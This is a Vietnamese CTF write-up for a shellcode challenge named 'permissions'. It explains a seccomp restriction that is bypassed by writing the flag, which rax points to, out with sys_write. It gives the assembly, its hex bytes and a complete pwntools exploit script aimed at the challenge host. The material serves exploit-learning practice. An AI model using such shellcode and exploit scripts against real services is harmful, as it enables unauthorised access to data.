# permissions
## Phân tích
- Đại loại là chương trình sẽ thực thi shellcode của ta. Tuy nhiên có các seccomp
- Dùng `seccomp-tools` để kiểm tra các seccomp được dùng và không được dùng
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/e669d25c-cca3-448c-b32e-b93996c182f4)
- Khi dừng lại trước khi thực thi shellcode, ta để ý thanh `rax` có địa chỉ chứa flag
- Do vậy ta sẽ dùng `sys_write` để ghi nó ra màn hình [link về cách sử dụng syscall](https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html)
```
mov rsi, rax
mov rax, 0x1
mov rdi, 0x1,
mov rdx, 0x100
syscall
```
- Mình dùng tool [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly2) để chuyển sang hex thay vì dùng asm() trong pwntool vì dùng asm() hơi lâu cho mỗi lần chạy
## Khai thác
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31174)
else:
        p = process(exe.path)


GDB()
payload = "\x48\x89\xC6\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
sla(b">", payload)
p.interactive()

```